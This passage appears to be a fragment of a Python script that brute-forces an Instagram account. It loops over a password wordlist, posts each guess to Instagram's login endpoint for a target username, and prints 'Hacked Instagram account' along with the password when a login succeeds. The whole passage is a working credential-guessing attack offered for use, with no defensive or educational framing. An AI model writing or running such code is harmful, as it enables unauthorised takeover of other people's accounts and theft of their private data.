# Load the wordlist of passwords
with open(wordlist_file, 'r') as f:
    passwords = f.read().splitlines()

# Iterate through the passwords
for password in passwords:
    # Send a POST request to the Instagram login page
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    data = {
        'username': username,
        'password': password
    }
    response = session.post(login_url, data=data)

    # Check the response for a successful login
    if 'authenticated' in response.text:
        print(f'Hacked Instagram account: {username}')
        print(f'Password: {password}')
        break
    else:
        print(f'Trying password: {password}')